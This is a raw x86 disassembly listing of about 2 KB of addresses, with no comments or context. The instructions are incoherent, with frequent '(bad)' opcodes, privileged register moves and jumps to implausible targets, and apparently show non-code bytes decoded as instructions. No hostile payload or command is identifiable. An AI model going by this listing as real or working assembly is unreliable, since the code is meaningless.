  4117cb:	and    BYTE PTR [eax],ah
  4117cd:	and    BYTE PTR [ecx],al
  4117cf:	dec    eax
  4117d0:	call   DWORD PTR ds:0x429424
  4117d6:	fadd   DWORD PTR [edx+0x382092]
  4117dc:	or     DWORD PTR [edx],eax
  4117de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117df:	sbb    BYTE PTR [eax+eax*2],0x86
  4117e3:	adc    BYTE PTR [ebx],dl
  4117e5:	rcr    BYTE PTR [ebx],0x6
  4117e8:	add    al,0x0
  4117ea:	inc    ecx
  4117eb:	add    al,BYTE PTR [eax]
  4117ed:	add    BYTE PTR [eax+ebx*1],al
  4117f0:	push   0x1105804
  4117f5:	shl    BYTE PTR [edx],1
  4117f7:	and    al,BYTE PTR [eax+0x20815140]
  4117fd:	inc    ecx
  4117fe:	inc    eax
  4117ff:	xor    BYTE PTR [ecx],dl
  411801:	int3   
  411802:	and    BYTE PTR [ecx+0x4010],bl
  411808:	push   eax
  411809:	add    BYTE PTR [edx],al
  41180b:	xchg   edx,eax
  41180c:	sub    al,0x60
  41180e:	arpl   sp,cx
  411810:	dec    eax
  411811:	adc    al,al
  411813:	adc    BYTE PTR [eax],al
  411815:	and    BYTE PTR [eax],dl
  411817:	add    BYTE PTR [ecx+0x860474],cl
  41181d:	xor    BYTE PTR [eax],ah
  41181f:	add    al,0x6
  411821:	imul   ecx,DWORD PTR [eax+0x18004180],0x203daa02
  41182b:	sub    ah,BYTE PTR [ecx+0x4]
  41182e:	or     al,0x48
  411830:	nop
  411831:	add    BYTE PTR [eax],ah
  411833:	test   BYTE PTR [edx],dh
  411835:	dec    edx
  411836:	dec    edi
  411837:	mov    ds:0x10400008,al
  41183c:	mov    BYTE PTR [edx+0x2],al
  41183f:	push   edx
  411840:	and    bl,BYTE PTR [eax]
  411842:	add    BYTE PTR [eax],bl
  411844:	mov    BYTE PTR [ecx-0x7e4ffd74],cl
  41184a:	xchg   edx,eax
  41184b:	xor    al,0x48
  41184d:	mov    ds:0xab80900c,al
  411852:	sub    BYTE PTR [ecx],ah
  411854:	or     BYTE PTR [eax+0x6],0x0
  411858:	and    BYTE PTR [eax],0xc1
  41185b:	add    DWORD PTR [edx],0x82000001
  411861:	jo     0x4117e6
  411863:	add    BYTE PTR [eax+eax*4],0xc0
  411867:	popa   
  411868:	mov    al,0x1
  41186a:	add    BYTE PTR [ecx],al
  41186c:	and    BYTE PTR [ecx+0x111241a0],ah
  411872:	add    BYTE PTR [eax-0x6c],0x2
  411876:	xor    BYTE PTR [ebx+0x14],ah
  411879:	adc    al,cl
  41187b:	add    BYTE PTR [ecx],al
  41187d:	add    eax,0x12092902
  411882:	add    DWORD PTR [eax+0x5437009],0x84224
  41188c:	add    BYTE PTR [edx],al
  41188e:	adc    al,0x60
  411890:	add    DWORD PTR [edx+0x46],0x30280011
  411897:	add    DWORD PTR [eax+0x4],esp
  41189a:	xor    ebp,ecx
  41189c:	int    0x20
  41189e:	adc    al,BYTE PTR [eax+0x48801c26]
  4118a4:	sub    ebx,DWORD PTR [eax]
  4118a6:	add    al,0x44
  4118a8:	add    BYTE PTR [edx],0x84
  4118ab:	(bad)  
  4118ac:	or     BYTE PTR [edx+ecx*2],dl
  4118af:	push   es
  4118b0:	and    BYTE PTR [edx],dl
  4118b2:	aaa    
  4118b3:	xor    BYTE PTR [eax],dl
  4118b5:	pusha  
  4118b6:	inc    edx
  4118b7:	test   al,0x9
  4118b9:	in     al,0x58
  4118bb:	inc    edx
  4118bc:	clc    
  4118bd:	and    ah,BYTE PTR [ecx]
  4118bf:	add    BYTE PTR [ebx],al
  4118c1:	inc    eax
  4118c2:	inc    ebp
  4118c3:	sub    BYTE PTR [eax+0x5d003048],0x98
  4118ca:	cmp    ah,BYTE PTR [ebx]
  4118cc:	mov    cl,0xc2
  4118ce:	or     BYTE PTR [eax+0x40a02344],al
  4118d4:	add    DWORD PTR [ecx+0xca2448],ebp
  4118da:	add    DWORD PTR [ecx+0x60],eax
  4118dd:	add    dl,BYTE PTR [edx+eiz*1]
  4118e0:	add    al,BYTE PTR [eax]
  4118e2:	add    bl,BYTE PTR [eax-0x7ffbffe1]
  4118e8:	inc    ebp
  4118e9:	dec    ebx
  4118ea:	adc    eax,0x90c0940
  4118ef:	adc    BYTE PTR [eax+0x8504d0b],al
  4118f5:	push   ss
  4118f6:	dec    esp
  4118f7:	and    DWORD PTR [eax+0x28],eax
  4118fa:	sbb    BYTE PTR [eax+0x5808000],dh
  411900:	xor    BYTE PTR [eax+0x6000400],ah
  411906:	add    DWORD PTR [edi+eax*8+0x9],eax
  41190a:	add    DWORD PTR [eax+0x18440440],edx
  411910:	add    eax,eax
  411912:	and    BYTE PTR [esp+ecx*1+0x21604399],al
  411919:	inc    eax
  41191a:	and    al,0x0
  41191c:	adc    BYTE PTR [eax],dl
  41191e:	mov    ds:0x4000e0b0,eax
  411923:	add    eax,0x2000308a
  411928:	mov    al,ds:0x88ac3e0
  41192d:	les    eax,FWORD PTR [esi]
  41192f:	pusha  
  411930:	pop    es
  411931:	adc    BYTE PTR [edi],0x0
  411934:	add    al,BYTE PTR [eax]
  411936:	add    DWORD PTR [edx],0x44801226
  41193c:	nop
  41193d:	or     DWORD PTR [eax],esp
  41193f:	mov    WORD PTR [eax],es
  411941:	sbb    DWORD PTR [eax],edx
  411943:	or     BYTE PTR [eax+eax*8+0x6],al
  411947:	pusha  
  411948:	rol    DWORD PTR [eax],1
  41194a:	loop   0x411920
  41194c:	mov    al,ds:0x2d1a28
  411951:	xor    BYTE PTR [eax],dl
  411953:	daa    
  411954:	add    BYTE PTR ds:0x2422032,0x21
  41195b:	add    DWORD PTR [eax],eax
  41195d:	add    DWORD PTR [eax+0x4072b001],esp
  411963:	add    BYTE PTR [ebx],al
  411965:	add    BYTE PTR [eax+0x0],dl
  411968:	and    al,0x8
  41196a:	xchg   ecx,eax
  41196b:	add    al,0x20
  41196d:	mov    ds:0x242000a0,al
  411972:	adc    BYTE PTR [edx-0x7abaffec],dh
  411978:	nop
  411979:	test   al,0x44
  41197b:	inc    ebx
  41197c:	lods   al,BYTE PTR ds:[esi]
  41197d:	sub    ch,0x4
  411980:	mov    BYTE PTR [ecx],cl
  411982:	add    al,BYTE PTR [eax]
  411984:	and    BYTE PTR fs:[ebx+esi*1+0x0],al
  411989:	push   0x213e02d
  41198e:	and    eax,ecx
  411990:	push   edx
  411991:	sbb    BYTE PTR [esi+0x105018],bh
  411997:	sub    al,ch
  411999:	or     eax,DWORD PTR [eax+0x60488202]
  41199f:	and    al,0x20
  4119a1:	add    BYTE PTR [ebx-0x6973fbd8],dl
  4119a7:	or     BYTE PTR [eax+0x50100002],0xc
  4119ae:	pusha  
  4119af:	fist   DWORD PTR [edx]
  4119b1:	adc    DWORD PTR [ecx],eax
  4119b3:	inc    eax
  4119b4:	and    BYTE PTR [eax],0x4b
  4119b7:	add    al,0x8
  4119b9:	add    DWORD PTR [edx+eax*2],edx
  4119bc:	inc    ecx
  4119bd:	add    BYTE PTR [ecx],cl
  4119bf:	inc    eax
  4119c0:	add    BYTE PTR [edx],al
  4119c2:	push   eax
  4119c3:	add    ah,cl
  4119c5:	xchg   esp,eax
  4119c6:	dec    ecx
  4119c7:	add    BYTE PTR [ebx],0x86
  4119ca:	or     cl,BYTE PTR [ecx]
  4119cc:	push   edi
  4119cd:	add    BYTE PTR [eax+0x181a41],bh
  4119d3:	add    DWORD PTR [esi],edx
  4119d5:	fild   DWORD PTR [ecx]
  4119d7:	inc    esp
  4119d8:	and    BYTE PTR [eax-0x6f],al
  4119db:	push   eax
  4119dc:	and    DWORD PTR [esi],ecx
  4119de:	or     al,0x10
  4119e0:	sub    DWORD PTR [eax],eax
  4119e2:	add    BYTE PTR [ecx+0x20008208],bl
  4119e8:	or     BYTE PTR [eax],al
  4119ea:	and    eax,0x20020
  4119ef:	and    BYTE PTR [ecx],al
  4119f1:	add    BYTE PTR [eax+0xaa54938],al
  4119f7:	xor    DWORD PTR [esp+eax*2+0x60000051],ecx
  4119fe:	adc    BYTE PTR [eax],al
  411a00:	and    BYTE PTR [edx],al
  411a02:	and    BYTE PTR [eax+0x22],al
  411a05:	inc    eax
  411a06:	dec    esp
  411a07:	dec    ecx
  411a08:	or     BYTE PTR [eax-0x7c],al
  411a0b:	pop    esp
  411a0c:	add    eax,DWORD PTR [eax]
  411a0e:	inc    ebx
  411a0f:	mov    BYTE PTR [edx],al
  411a11:	mov    al,es:0x8008b600
  411a17:	or     dl,BYTE PTR [eax]
  411a19:	sub    al,BYTE PTR [esp+eax*8]
  411a1c:	inc    esp
  411a1d:	nop
  411a1e:	add    BYTE PTR [eax+0xb12c13],al
  411a24:	or     BYTE PTR [eax+eax*1],cl
  411a27:	and    BYTE PTR [eax],dl
  411a29:	push   ds
  411a2a:	add    al,0x82
  411a2c:	test   BYTE PTR [edx+eiz*4+0x490005c],al
  411a33:	add    BYTE PTR [esi+eiz*2+0x19c01000],ch
  411a3a:	mov    cl,BYTE PTR [edx]
  411a3c:	xor    dl,BYTE PTR [eax+eax*4+0x70014209]
  411a43:	mov    DWORD PTR [eax],eax
  411a45:	and    BYTE PTR [eax],al
  411a47:	xor    BYTE PTR [edi+eiz*8],al
  411a4a:	add    BYTE PTR [ecx+0x2b15802],al
  411a50:	pop    es
  411a51:	test   al,0x42
  411a53:	add    al,0xa4
  411a55:	sub    DWORD PTR [edx],edx
  411a57:	rol    BYTE PTR [ecx+0xa],0xa
  411a5b:	xor    dl,BYTE PTR ds:0x2480983b
  411a61:	push   es
  411a62:	add    al,0xc0
  411a64:	add    BYTE PTR [eax],dl
  411a66:	pusha  
  411a67:	adc    BYTE PTR [esi],ah
  411a69:	or     BYTE PTR [esi+0x25a0f610],al
  411a6f:	and    DWORD PTR [eax],ecx
  411a71:	dec    eax
  411a72:	test   DWORD PTR [ecx],eax
  411a74:	or     al,BYTE PTR [eax]
  411a76:	add    BYTE PTR [eax+eax*2],bh
  411a79:	adc    al,BYTE PTR [edx-0x68]
  411a7c:	adc    BYTE PTR [eax+0x6d021006],dl
  411a82:	add    BYTE PTR [eax],ah
  411a84:	add    BYTE PTR [ecx-0x76],0x4
  411a88:	xchg   BYTE PTR [ebp+0xc55c2a],al
  411a8e:	dec    eax
  411a8f:	and    BYTE PTR [eax],al
  411a91:	add    DWORD PTR [eax],eax
  411a93:	sbb    BYTE PTR ds:0x1a000b42,al
  411a99:	add    BYTE PTR [eax+0x30a13059],al
  411a9f:	jo     0x411ab1
  411aa1:	and    al,BYTE PTR [eax]
  411aa3:	mov    al,ds:0x40009152
  411aa8:	add    DWORD PTR [eax],esp
  411aaa:	and    al,0x5c
  411aac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411aad:	adc    ah,BYTE PTR [edx]
  411aaf:	dec    ecx
  411ab0:	or     al,0x50
  411ab2:	add    DWORD PTR [eax],eax
  411ab4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ab5:	cdq    
  411ab6:	xchg   esp,eax
  411ab7:	add    al,BYTE PTR [eax]
  411ab9:	fs or  BYTE PTR es:[ecx-0x6dfb6c00],0x30
  411ac2:	or     BYTE PTR [edx],dl
  411ac4:	and    BYTE PTR [edx],ah
  411ac6:	pusha  
  411ac7:	jo     0x411a4b
  411ac9:	add    BYTE PTR [ecx+eiz*1],al
  411acc:	and    BYTE PTR [esi],al
  411ace:	and    eax,DWORD PTR [eax]
  411ad0:	or     BYTE PTR [ebp+0x0],dl
  411ad3:	add    BYTE PTR [ebx+eax*4],cl
  411ad6:	and    DWORD PTR [ecx],esp
  411ad8:	cmp    al,0xa
  411ada:	or     BYTE PTR [eax],ah
  411adc:	add    DWORD PTR [ecx],edi
  411ade:	and    DWORD PTR [edx],edx
  411ae0:	and    dl,BYTE PTR [eax]
  411ae2:	dec    esp
  411ae3:	dec    eax
  411ae4:	add    BYTE PTR [eax-0x7f],al
  411ae7:	ret    
  411ae8:	add    BYTE PTR [eax],dl
  411aea:	add    BYTE PTR [eax+eiz*4+0x4],cl
  411aee:	and    BYTE PTR [edx-0x37dea3c0],al
  411af4:	add    ch,al
  411af6:	or     BYTE PTR [eax],al
  411af8:	test   BYTE PTR [ecx+0x41],ah
  411afb:	inc    eax
  411afc:	or     al,0x90
  411afe:	and    bl,BYTE PTR [ecx*1+0x2002e421]
  411b05:	add    BYTE PTR [esi],dl
  411b07:	inc    ecx
  411b08:	and    ah,BYTE PTR [eax]
  411b0a:	and    BYTE PTR [ecx+0x9010030],al
  411b10:	sub    ah,BYTE PTR [ecx]
  411b12:	adc    BYTE PTR [eax],al
  411b14:	add    al,0x20
  411b16:	and    eax,0x29c0c00
  411b1b:	test   BYTE PTR [eax+0x34331102],dl
  411b21:	xchg   edx,eax
  411b22:	rcl    BYTE PTR [eax+0x28812a21],0x1
  411b29:	add    al,0x0
  411b2b:	retf   
  411b2c:	les    eax,FWORD PTR [eax]
  411b2e:	adc    dl,BYTE PTR [eax]
  411b30:	add    BYTE PTR [eax+0x5],al
  411b33:	add    eax,0x5944042
  411b38:	sub    al,0x20
  411b3a:	inc    eax
  411b3b:	and    DWORD PTR [eax+0x21],ecx
  411b3e:	add    eax,0x20422820
  411b43:	or     DWORD PTR [eax],0x16
  411b46:	sub    BYTE PTR [eax+0x2],ah
  411b49:	adc    BYTE PTR [edx],cl
  411b4b:	and    ah,0x0
  411b4e:	adc    al,0x19
  411b50:	push   edx
  411b51:	xor    eax,0x2628050
  411b56:	add    BYTE PTR [edx],al
  411b58:	xchg   ebp,eax
  411b59:	inc    esi
  411b5a:	add    DWORD PTR [edi],eax
  411b5c:	adc    al,0x8
  411b5e:	bound  eax,QWORD PTR [eax]
  411b60:	add    edx,edx
  411b62:	pusha  
  411b63:	adc    bl,cl
  411b65:	add    BYTE PTR es:[eax],ch
  411b68:	add    BYTE PTR [ecx+0x24],ah
  411b6b:	and    DWORD PTR [eax],eax
  411b6d:	mov    ds:0x91008404,al
  411b72:	add    BYTE PTR [eax+0x20400009],al
  411b78:	sbb    BYTE PTR [edx-0x66e7c9d7],al
  411b7e:	mov    ds:0x91000c0,al
  411b83:	add    eax,0x9ea98006
  411b88:	(bad)  
  411b89:	adc    al,0x89
  411b8b:	mov    BYTE PTR [edx+eax*2],al
  411b8e:	test   eax,0x8002808
  411b93:	xchg   esp,eax
  411b94:	add    BYTE PTR [eax+ecx*1+0x45801300],0xa
  411b9c:	adc    DWORD PTR [ecx+0x74002010],ecx
  411ba2:	les    esp,FWORD PTR [eax]
  411ba4:	sbb    BYTE PTR [eax+0x2],cl
  411ba7:	add    BYTE PTR [ecx+0x86108],cl
  411bad:	add    al,0xe1
  411baf:	xor    BYTE PTR [edx],dh
  411bb1:	or     ebx,eax
  411bb3:	sbb    DWORD PTR [eax],ecx
  411bb5:	and    eax,DWORD PTR [eax]
  411bb7:	pop    es
  411bb8:	add    DWORD PTR [edx],ebx
  411bba:	xchg   ecx,eax
  411bbb:	cmp    BYTE PTR [ecx-0x1dea6b6f],0x9
  411bc2:	nop
  411bc3:	add    BYTE PTR [eax+0x4],cl
  411bc6:	or     eax,DWORD PTR [esp+eax*1]
  411bc9:	enter  0x2,0xa5
  411bcd:	inc    ebx
  411bce:	adc    al,0x2
  411bd0:	cmp    DWORD PTR [eax-0x6ff5bff6],eax
  411bd6:	mov    al,ds:0x6481a0a0
  411bdb:	or     BYTE PTR [edx+0x40],dl
  411bde:	sbb    DWORD PTR [eax],eax
  411be0:	dec    ecx
  411be1:	lock sub BYTE PTR [edx+0x32009000],dl
  411be8:	add    BYTE PTR [edx],dl
  411bea:	dec    ebx
  411beb:	or     BYTE PTR [edi],ah
  411bed:	loopne 0x411b6f
  411bef:	add    BYTE PTR [eax+eax*1],ch
  411bf2:	adc    BYTE PTR [esi],cl
  411bf4:	add    BYTE PTR [esi],al
  411bf6:	adc    BYTE PTR [eax],al
  411bf8:	inc    edx
  411bf9:	add    BYTE PTR [eax+0x14],al
  411bfc:	add    BYTE PTR [edx],ch
  411bfe:	add    cl,ah
  411c00:	test   al,0x0
  411c02:	add    BYTE PTR [edx-0x7c],bl
  411c05:	or     BYTE PTR [eax+0x71082004],al
  411c0b:	inc    ecx
  411c0c:	add    eax,0x58a25000
  411c11:	or     DWORD PTR [edi+0x4],0x40a0438
  411c18:	add    BYTE PTR [eax+eiz*4],al
  411c1b:	inc    ebp
  411c1c:	add    eax,0x902000
  411c22:	add    DWORD PTR [edx+0x4104230],eax
  411c28:	lock add BYTE PTR [eax+0x8],al
  411c2c:	xor    BYTE PTR [eax+eax*1],al
  411c2f:	add    DWORD PTR [eax],esi
  411c31:	je     0x411bb5
  411c33:	rcl    BYTE PTR [eax+0x75d1032],0x2
  411c3a:	pop    eax
  411c3b:	adc    eax,0x15244613
  411c40:	sub    al,0x44
  411c42:	inc    eax
  411c43:	or     cl,BYTE PTR [eax+0x1]
  411c46:	inc    eax
  411c47:	and    BYTE PTR [edx],bl
  411c49:	inc    eax
  411c4a:	adc    BYTE PTR [eax+0x0],cl
  411c4d:	adc    BYTE PTR [eax],ah
  411c4f:	dec    eax
  411c50:	lea    esp,[eax-0x476de000]
  411c56:	add    DWORD PTR [ecx],0x40
  411c59:	adc    DWORD PTR [eax],eax
  411c5b:	mov    dl,al
  411c5d:	mov    ecx,0x5494f4c0
  411c62:	xchg   ecx,eax
  411c63:	and    BYTE PTR [eax+0x48880001],ah
  411c69:	and    al,BYTE PTR [edx+0x40033800]
  411c6f:	dec    eax
  411c70:	sbb    al,0x44
  411c72:	pusha  
  411c73:	rol    BYTE PTR [eax],0x24
  411c76:	add    BYTE PTR [eax+0x16],cl
  411c79:	inc    esi
  411c7a:	or     BYTE PTR [eax],cl
  411c7c:	add    BYTE PTR [eax],dh
  411c7e:	add    edx,DWORD PTR [eax]
  411c80:	adc    DWORD PTR [eax],esp
  411c82:	or     eax,0x40c15014
  411c87:	adc    eax,0x91017886
  411c8c:	add    DWORD PTR [eax+0x8],eax
  411c8f:	or     BYTE PTR [ecx+0x6d],0x20
  411c93:	add    edx,DWORD PTR [eax+eax*1+0x20442024]
  411c9a:	imul   eax,DWORD PTR [edx],0x40ae8000
  411ca0:	loopne 0x411c23
  411ca2:	add    al,BYTE PTR [ebx+0x3a04040]
  411ca8:	xor    BYTE PTR [eax+0x11],al
  411cab:	add    BYTE PTR [eax+eiz*1],dh
  411cae:	test   BYTE PTR ds:0x1000065e,al
  411cb4:	push   ebx
  411cb5:	add    al,0x42
  411cb7:	add    BYTE PTR [eax+0x4002b850],dl
  411cbd:	dec    eax
  411cbe:	add    BYTE PTR [eax],ah
  411cc0:	or     BYTE PTR [eax+eax*1],al
  411cc3:	and    eax,0xc4083800
  411cc8:	and    al,BYTE PTR [edi-0x7f2faebe]
  411cce:	add    dl,BYTE PTR [ebx]
  411cd0:	sbb    BYTE PTR [eax],dl
  411cd2:	ror    BYTE PTR [edx+0x1e],1
  411cd5:	inc    eax
  411cd6:	and    BYTE PTR [eax+0x28e23134],al
  411cdc:	add    eax,0x80080000
  411ce1:	xchg   BYTE PTR [ebx],dl
  411ce3:	adc    DWORD PTR [edx+ecx*2],0x448191a0
  411cea:	adc    BYTE PTR [eax],cl
  411cec:	add    DWORD PTR [edx-0x7befceec],eax
  411cf2:	or     al,0x20
  411cf4:	add    BYTE PTR [eax],0x8
  411cf7:	and    BYTE PTR [eax],al
  411cf9:	sbb    BYTE PTR [ebx+0x8],dl
  411cfc:	add    edx,DWORD PTR [edx-0x56d92fd7]
  411d02:	and    al,0x20
  411d04:	add    al,0x4
  411d06:	add    eax,eax
  411d08:	mov    ds:0x1007288a,eax
  411d0d:	mov    ah,BYTE PTR [ebp-0x1fde5c00]
  411d13:	add    BYTE PTR [eax],dh
  411d15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d16:	inc    ecx
  411d17:	pop    ebp
  411d18:	and    DWORD PTR [ebp+0x30],esp
  411d1b:	sub    BYTE PTR [eax],0x35
  411d1e:	add    al,0x13
  411d20:	adc    al,0x2
  411d22:	adc    BYTE PTR [eax],cl
  411d24:	add    al,0x84
  411d26:	add    BYTE PTR [eax],cl
  411d28:	add    BYTE PTR [esi],ch
  411d2a:	add    BYTE PTR [ebx+eiz*2+0x39090211],0x48
  411d32:	adc    ecx,DWORD PTR [edx-0x7f]
  411d35:	mov    al,ds:0x215482
  411d3a:	cmp    BYTE PTR [edi],al
  411d3c:	push   eax
  411d3d:	push   eax
  411d3e:	and    BYTE PTR [edx],0x42
  411d41:	add    DWORD PTR [eax+eax*1+0x88a9080],eax
  411d48:	test   BYTE PTR [eax+eax*2],ch
  411d4b:	add    DWORD PTR [eax],esp
  411d4d:	and    BYTE PTR [ebx],dl
  411d4f:	xchg   ecx,eax
  411d50:	adc    BYTE PTR [eax+0x2234c820],cl
  411d56:	nop
  411d57:	and    BYTE PTR [eax+0x304218ca],bl
  411d5d:	popa   
  411d5e:	adc    BYTE PTR [ecx-0x78],al
  411d61:	enter  0x49,0x31
  411d65:	add    BYTE PTR ds:0x44280c4,ah
  411d6b:	mov    BYTE PTR [eax+eax*1],cl
  411d6e:	cmp    BYTE PTR [edx],cl
  411d70:	loopne 0x411d62
  411d72:	(bad)  
  411d73:	(bad)  
  411d74:	and    al,0x20
  411d76:	sub    BYTE PTR [ecx-0x73e07f9e],cl
  411d7c:	or     DWORD PTR [edx+0x40014045],0x48430c04
  411d86:	lea    edx,[eax]
  411d88:	inc    eax
  411d89:	add    ecx,ebx
  411d8b:	add    al,BYTE PTR [edx+0x50]
  411d8e:	or     ah,BYTE PTR [eax]
  411d90:	add    BYTE PTR [eax+0x9802214],cl
  411d96:	cwde   
  411d97:	adc    BYTE PTR [eax],cl
  411d99:	and    eax,ecx
  411d9b:	add    BYTE PTR [edi],0xc1
  411d9e:	shl    DWORD PTR [ecx+eiz*4],0x10
  411da2:	adc    DWORD PTR [eax],eax
  411da4:	fisttp QWORD PTR [eax]
  411da6:	test   al,dl
  411da8:	adc    BYTE PTR [eax],al
  411daa:	xchg   esp,eax
  411dab:	adc    dh,bl
  411dad:	inc    esi
  411dae:	push   esp
  411daf:	add    BYTE PTR [edx+eax*4],al
  411db2:	loopne 0x411d46
  411db4:	(bad)
  411db7:	add    BYTE PTR [eax-0x4ed6bfbf],0xc3
  411dbe:	add    BYTE PTR [eax],al
  411dc0:	mov    al,ds:0x3e449214
  411dc5:	add    BYTE PTR [ecx],0x10
  411dc8:	add    BYTE PTR [eax+0x9],bh
  411dcb:	or     ecx,DWORD PTR [ecx]
  411dcd:	nop
  411dce:	and    cl,BYTE PTR [eax-0x6b9abff8]
  411dd4:	push   0x509c1041
  411dd9:	add    al,0x80
  411ddb:	push   eax
  411ddc:	and    eax,DWORD PTR [eax]
  411dde:	add    BYTE PTR [edx],ah
  411de0:	add    al,BYTE PTR [eax]
  411de2:	sub    BYTE PTR [eax+0x4b810fe0],al
  411de8:	inc    ecx
  411de9:	add    BYTE PTR [eax],0x4
  411dec:	add    cl,al
  411dee:	dec    ecx
  411def:	adc    BYTE PTR [eax],ah
  411df1:	add    al,al
  411df3:	and    al,0x4
  411df5:	pop    edx
  411df6:	add    DWORD PTR [edx+0x58],eax
  411df9:	or     DWORD PTR [eax+0x61],ecx
  411dfc:	push   ss
  411dfd:	adc    dl,cl
  411dff:	and    BYTE PTR [eax+0x0],dl
  411e02:	and    al,BYTE PTR [edx]
  411e04:	sub    al,cl
  411e06:	push   eax
  411e07:	and    DWORD PTR [eax+ecx*2+0x202830c0],0x83855008
  411e12:	add    BYTE PTR ds:0x4c920,al
  411e18:	add    DWORD PTR [eax],eax
  411e1a:	and    BYTE PTR [eax+0x151800],0x0
  411e21:	sub    BYTE PTR [eax],al
  411e23:	pusha  
  411e24:	inc    esi
  411e25:	push   esp
  411e26:	adc    BYTE PTR [esi+0x2a100a81],dl
  411e2c:	mov    al,ds:0x48218040
  411e31:	add    BYTE PTR [eax],al
  411e33:	xchg   ecx,eax
  411e34:	dec    ebp
  411e35:	or     BYTE PTR ds:0x23b84104,al
  411e3b:	setb   BYTE PTR [eax+0x2a]
  411e3f:	inc    eax
  411e40:	or     al,0x73
  411e42:	or     al,BYTE PTR [eax]
  411e44:	add    BYTE PTR [eax],al
  411e46:	mov    esp,cr0
  411e49:	push   eax
  411e4a:	inc    eax
  411e4b:	adc    esi,esp
  411e4d:	add    DWORD PTR [eax],eax
  411e4f:	inc    eax
  411e50:	and    BYTE PTR [eax],ah
  411e52:	add    al,0x14
  411e54:	rol    dl,0xa
  411e57:	xor    BYTE PTR [eax],bl
  411e59:	and    al,0x38
  411e5b:	mov    cl,0x6
  411e5d:	adc    BYTE PTR [ecx],al
  411e5f:	and    al,0x5
  411e61:	add    eax,0x68145042
  411e66:	and    al,0x0
  411e68:	or     BYTE PTR [ecx],ch
  411e6a:	inc    eax
  411e6b:	rol    BYTE PTR [edx+0x20],0x4a
  411e6f:	add    BYTE PTR [ecx],0x38
  411e72:	add    DWORD PTR [eax],edi
  411e74:	mov    ah,bh
  411e76:	mov    eax,ds:0x40b8
  411e7b:	push   cs
  411e7c:	pop    esp
  411e7d:	and    DWORD PTR [eax],edx
  411e7f:	pusha  
  411e80:	test   BYTE PTR [eax],cl
  411e82:	add    DWORD PTR [ecx],eax
  411e84:	sub    DWORD PTR [esi+eax*1+0x11c24404],edx
  411e8b:	and    dl,BYTE PTR [eax+0x2c]
  411e8e:	adc    BYTE PTR [eax+0x1],ch
  411e91:	adc    BYTE PTR [eax+eax*1],0x10
  411e95:	xchg   esp,eax
  411e96:	or     BYTE PTR [edx+0x210e0103],ah
  411e9c:	add    dl,BYTE PTR [eax+edx*2]
  411e9f:	adc    BYTE PTR [eax],ch
  411ea1:	test   BYTE PTR [edi],al
  411ea3:	inc    eax
  411ea4:	and    BYTE PTR [eax],bl
  411ea6:	sub    al,0x40
  411ea8:	or     dl,BYTE PTR [eax+0x62]
  411eab:	call   0xe04b9b08
  411eb0:	rol    BYTE PTR [ecx],0xc
  411eb3:	inc    eax
  411eb4:	sbb    cl,ah
  411eb6:	sbb    DWORD PTR [eax],ecx
  411eb8:	or     eax,0x64c19426
  411ebd:	dec    esi
  411ebe:	add    DWORD PTR [eax],eax
  411ec0:	pusha  
  411ec1:	and    DWORD PTR [eax],esp
  411ec3:	add    DWORD PTR [esp+ecx*2],eax
  411ec6:	rcl    eax,0x14
  411ec9:	sub    BYTE PTR [eax],ch
  411ecb:	add    BYTE PTR [ecx],al
  411ecd:	adc    DWORD PTR [ecx+0x20],esi
  411ed0:	add    BYTE PTR [ecx+eiz*4+0x40020144],ah
  411ed7:	or     DWORD PTR [ecx-0x66dbf7ff],edx
  411edd:	and    eax,0x15404446
  411ee2:	cwde   
  411ee3:	xchg   ebx,eax
  411ee4:	sbb    ah,BYTE PTR [ebp-0x58d7e57c]
  411eea:	inc    esp
  411eeb:	add    esi,ebp
  411eed:	mov    BYTE PTR [ecx],ah
  411eef:	sub    BYTE PTR [eax-0x2c],dl
  411ef2:	add    ah,BYTE PTR [eax]
  411ef4:	sub    bl,BYTE PTR [eax+eax*1+0x2]
  411ef8:	adc    BYTE PTR [edx-0x40],al
  411efb:	pop    eax
  411efc:	mov    al,0x2
  411efe:	pusha  
  411eff:	cmp    al,BYTE PTR [eax]
  411f01:	adc    BYTE PTR [eax],al
  411f03:	add    BYTE PTR [ecx+eax*1],al
  411f06:	add    BYTE PTR [eax],0x3
  411f09:	or     DWORD PTR [ebx+ecx*1],eax
  411f0c:	xchg   edx,eax
  411f0d:	or     DWORD PTR [eax+0x4],ecx
  411f10:	mov    al,ds:0x42422b0
  411f15:	adc    al,0x98
  411f17:	sub    ah,ah
  411f19:	xor    BYTE PTR [ecx],0x49
  411f1c:	xor    BYTE PTR [esp+eax*1-0x7a1bfbc8],ch
  411f23:	or     BYTE PTR [ecx+0x6800038],0x0
  411f2a:	add    BYTE PTR [esi],al
  411f2c:	add    al,al
  411f2e:	xor    BYTE PTR [eax],al
  411f30:	add    BYTE PTR [eax],dl
  411f32:	shl    DWORD PTR [edx-0x6a],1
  411f35:	xor    BYTE PTR [eax],0x81
  411f38:	inc    eax
  411f39:	add    BYTE PTR [ebp+0x22],ah
  411f3c:	inc    ecx
  411f3d:	add    al,0x20
  411f3f:	xor    BYTE PTR [ecx-0x7ffdf7e0],dh
  411f45:	add    DWORD PTR [edx],ebx
  411f47:	xchg   edx,eax
  411f48:	inc    eax
  411f49:	jo     0x216343ef
  411f4f:	inc    ebx
  411f50:	ret    0xa890
  411f53:	add    esp,DWORD PTR [eax]
  411f55:	pushf  
  411f56:	add    BYTE PTR [edx],al
  411f58:	arpl   WORD PTR [eax],sp
  411f5a:	and    BYTE PTR [eax],ch
  411f5c:	sbb    BYTE PTR [edx-0x73edfff0],al
  411f62:	rcl    al,0xb
  411f65:	and    BYTE PTR [eax+0x60],al
  411f68:	mov    al,ds:0x40011c8d
  411f6d:	sbb    BYTE PTR [edx],ah
  411f6f:	or     BYTE PTR [eax],al
  411f71:	push   0x20404880
  411f76:	add    al,0x38
  411f78:	sbb    BYTE PTR [eax],al
  411f7a:	and    al,BYTE PTR [eax+0x8002021]
  411f80:	inc    eax
  411f81:	dec    esp
  411f82:	les    esp,FWORD PTR [eax]
  411f84:	or     cl,BYTE PTR [ecx]
  411f86:	add    BYTE PTR [eax],ah
  411f88:	add    cl,BYTE PTR [ecx+0x2]
  411f8b:	sub    eax,esp
  411f8d:	shl    BYTE PTR [eax],0x6b
  411f90:	ret    0x4100
  411f93:	or     eax,0x21000800
  411f98:	adc    al,BYTE PTR [eax]
  411f9a:	leave  
  411f9b:	add    al,BYTE PTR [eax]
  411f9d:	add    DWORD PTR [edx+eax*2],esp
